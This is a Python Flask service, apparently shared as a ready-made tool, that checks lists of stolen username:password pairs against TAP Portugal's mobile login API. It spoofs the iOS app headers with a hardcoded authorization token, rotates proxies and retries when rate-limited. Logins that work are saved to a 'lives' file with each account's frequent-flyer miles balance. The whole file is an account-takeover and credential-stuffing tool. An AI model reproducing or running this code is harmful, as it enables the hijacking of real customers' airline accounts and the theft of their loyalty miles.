from flask import Flask, request, jsonify
import pycurl
import json
import random
import string
from io import BytesIO
import re
from threading import Lock
import time

app = Flask(__name__)

# Variáveis globais para contagem
live_count = 0
die_count = 0
count_lock = Lock()
file_lock = Lock()

TITLE = r"""
 _______ _______  _____       _______ _____        _     _ _______ _______
    |    |_____| |_____]      |  |  |   |   |      |_____| |_____| |______
    |    |     | |            |  |  | __|__ |_____ |     | |     | ______|
"""

def gerar_etrackingid():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def salvar_live(username, password, miles):
    try:
        with file_lock:
            with open("lives.txt", "a", encoding='utf-8') as file:
                file.write(f"{username}:{password} | Miles: {miles}\n")
                file.flush()
    except Exception as e:
        print(f"\033[91mErro ao salvar live: {e}\033[0m")

def incrementar_live():
    global live_count
    with count_lock:
        live_count += 1

def incrementar_die():
    global die_count
    with count_lock:
        die_count += 1

def configurar_proxy(curl, proxy):
    if proxy:
        proxy_parts = proxy.split('@')
        if len(proxy_parts) == 2:
            curl.setopt(pycurl.PROXY, proxy_parts[1].split(':')[0])
            curl.setopt(pycurl.PROXYPORT, int(proxy_parts[1].split(':')[1]))
            curl.setopt(pycurl.PROXYUSERPWD, proxy_parts[0])
        else:
            curl.setopt(pycurl.PROXY, proxy)

def buscar_milhas(customer_id, x_auth):
    url = f"https://rest-customer.tap.pt/v2/customer-services/customers/{customer_id}?PurposeCode=TAPPPREAD&PurposeVersion=1.0&PurposeSystemID=DIG"
    headers = [
        "Host: rest-customer.tap.pt",
        f"x-auth: {x_auth}",
        "accept: */*",
        "etrackingid: 3NAW6A",
        "application: tap.mobile.ios",
        "accept-language: pt-BR;q=1.0",
        "user-agent: TAP Portugal iOS",
        "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI"
    ]

    response_buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    curl.setopt(pycurl.HTTPHEADER, headers)
    curl.setopt(pycurl.WRITEDATA, response_buffer)
    curl.setopt(pycurl.ENCODING, 'gzip, deflate')

    try:
        curl.perform()
        http_status = curl.getinfo(pycurl.RESPONSE_CODE)
        if http_status == 200:
            response_body = response_buffer.getvalue().decode('utf-8')
            data = json.loads(response_body)
            return data.get("FrequentFlyerProgram", {}).get("TotalMiles", 0)
        return 0
    except Exception as e:
        print(f"\033[91mErro ao buscar milhas: {e}\033[0m")
        return 0
    finally:
        curl.close()

def verificar_credencial(username, password, proxy=None):
    tentativas = 0
    max_tentativas = 3
    
    while tentativas < max_tentativas:
        tentativas += 1
        etrackingid = gerar_etrackingid()
        
        headers = [
            "Host: rest-customer.tap.pt",
            "accept: */*",
            "content-type: application/json",
            f"etrackingid: {etrackingid}",
            "accept-language: pt-BR;q=1.0",
            "application: tap.mobile.ios",
            "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI",
            "user-agent: TAP Portugal iOS"
        ]

        data = {
            "Customer": {
                "Password": password,
                "ProviderType": "TP",
                "Username": username
            }
        }

        response_buffer = BytesIO()
        header_buffer = BytesIO()
        curl = pycurl.Curl()

        try:
            curl.setopt(pycurl.URL, "https://rest-customer.tap.pt/v2/customer-services/customers-login?PurposeSystemID=DIG&PurposeCode=TAPPPREAD&PurposeVersion=1.0")
            curl.setopt(pycurl.HTTPHEADER, headers)
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, json.dumps(data))
            curl.setopt(pycurl.WRITEDATA, response_buffer)
            curl.setopt(pycurl.HEADERFUNCTION, header_buffer.write)
            curl.setopt(pycurl.ENCODING, 'gzip, deflate')
            curl.setopt(pycurl.TIMEOUT, 30)
            curl.setopt(pycurl.CONNECTTIMEOUT, 15)

            if proxy:
                configurar_proxy(curl, proxy)

            curl.perform()

            http_status = curl.getinfo(pycurl.RESPONSE_CODE)
            if http_status == 200:
                response_body = response_buffer.getvalue().decode('utf-8')
                response_headers = header_buffer.getvalue().decode('utf-8')

                customer_id = json.loads(response_body).get("Customer", {}).get("CustomerID")
                x_auth_match = re.search(r"x-auth:\s*(Bearer\s\S+)", response_headers, re.IGNORECASE)
                x_auth = x_auth_match.group(1) if x_auth_match else None

                if customer_id and x_auth:
                    miles = buscar_milhas(customer_id, x_auth)
                    salvar_live(username, password, miles)
                    incrementar_live()
                    return {"status": "live", "username": username, "miles": miles, "message": "Credencial válida"}
            
            elif http_status == 429:
                time.sleep(2)
                continue
            
            incrementar_die()
            return {"status": "die", "username": username, "message": f"Credencial inválida (HTTP {http_status})"}

        except pycurl.error as e:
            print(f"\033[91m♻  RETESTANDO: {username}:{password} \033[0m")
            if tentativas == max_tentativas:
                incrementar_die()
                return {"status": "error", "username": username, "message": f"Erro de conexão: {str(e)}"}
        except Exception as e:
            print(f"\033[91m📡 Erro inesperado com {username}:{password} - {str(e)}\033[0m")
            if tentativas == max_tentativas:
                incrementar_die()
                return {"status": "error", "username": username, "message": f"Erro inesperado: {str(e)}"}
        finally:
            curl.close()
        
        time.sleep(1)

@app.route('/check', methods=['GET'])
def check_credential():
    # Obter credencial do parâmetro na URL (formato user:pass)
    credential = request.args.get('credential')
    if not credential or ':' not in credential:
        return jsonify({"status": "error", "message": "Formato inválido. Use user:pass"}), 400
    
    username, password = credential.split(':', 1)
    
    # Obter proxy se existir
    proxy = request.args.get('proxy', None)
    
    # Verificar a credencial
    result = verificar_credencial(username, password, proxy)
    
    return jsonify(result)

@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({
        "live_count": live_count,
        "die_count": die_count,
        "total": live_count + die_count
    })

if __name__ == '__main__':
    print("\033[94m" + TITLE + "\033[0m")
    print("\033[93m=== ✈ API CHECKER TAP MILHAS | 💻 CODED By: KURIOSOH CODER ===\033[0m\n")
    print("\033[93m🟢 Servidor Flask iniciado. Acesse http://localhost:5000/check?credential=user:pass\033[0m\n")
    
    app.run(host='0.0.0.0', port=5000)